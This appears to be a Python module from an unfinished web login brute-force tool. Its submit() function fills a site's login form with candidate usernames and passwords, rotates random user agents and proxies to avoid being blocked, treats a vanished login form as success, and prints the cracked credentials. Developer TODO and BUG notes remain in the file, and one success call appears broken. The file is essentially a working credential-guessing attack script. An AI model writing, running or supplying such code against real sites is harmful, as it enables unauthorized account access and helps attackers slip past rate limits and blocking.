### REWRITE httpbrute
## NO oop

"""
	TODO? OOP instead of functions
	for (usr, passwd) in (usernames, passwords):
		print_progress_bar()
		tryLogin (url, usr, passwd, options):
			if options._verbose_:
				print "trying usr:passwd"
			if _success_:
				creds.append(usr:passwd)
				remove(usr)
				print usr:passwd
			elif _error_:
				stop():
			else:
				pass
	print creds
"""
# TODO break task after matching
# BUG Redirect error after successful: keep sending to login page
# BUG Redirect error after successful: HTTPError w/ login page (no redirect param) WP - broken web app

import mechanize, sys
from core import utils, actions, tbrowser		

def submit(optionURL, tryUsername, tryPassword, sizeTask, setProxyList, setKeyFalse, optionVerbose, optionLog, loginInfo, trying):
	############################################
	#	Old code logic:
	#		Create 1 browser object per password
	#	Current:
	#		Create 1 browser object per username
	#		Pick 1 user agent per password try
	#
	############################################

	#	Get login form field informations
	frmLoginID, frmUserfield, frmPassfield = loginInfo
	#	Get single Username in username list / file	
	
	proc = tbrowser.startBrowser()

	#	Get single Password, remove \n

	#	New test code block: add new user_agent each try
	user_agent = tbrowser.useragent()
	proc.addheaders = [('User-Agent', user_agent)]
	
	
	
	if setProxyList:
		#Set proxy connect
		proxyAddr = actions.randomFromList(setProxyList)
		#utils.printf("Debug: proxy addr %s" %(proxyAddr))
		proc.set_proxies({"http": proxyAddr})

	proc.open(optionURL)
		#	End new code block
	
	try:

		#	Select login form
		proc.select_form(nr = frmLoginID)
		proc.form[frmUserfield] = tryUsername
		proc.form[frmPassfield] = tryPassword

		utils.printp(trying, sizeTask)

		#	Send request
		#proc.submit()

		#	Print status bar

		if optionVerbose:
			utils.printf("Trying: %s:%s" %(tryUsername, tryPassword), 'norm')

		proc.submit()
		#	Reload - useful for redirect to dashboard
		proc.reload()
		#	If no login form -> success
		#	TODO improve condition to use captcha

		if not tbrowser.parseLoginForm(proc.forms()):

			#TODO edit mixed condition
			if setKeyFalse:
				if setKeyFalse not in proc.response().read():
					
					# Add creds to success list
					# If verbose: print
					
					printSuccess(tryUsername, tryPassword)

					#	Clear object and try new username
					proc.close()

				else:
					if optionVerbose:
						utils.printf("Failed: %s:%s" %(tryUsername, tryPassword), "bad")
					
			else:
				utils.printSuccess(tryUsername, tryPassword)

				#	Clear object and try new username
				proc.close()
		else:
			if optionVerbose:
				utils.printf("Failed: %s:%s" %(tryUsername, tryPassword), "bad")

	except mechanize.HTTPError as error:
		#	Get blocked
		utils.die("Thread has been blocked", error)
	except Exception as error:
		utils.die("Error while running thread", error)

	proc.close()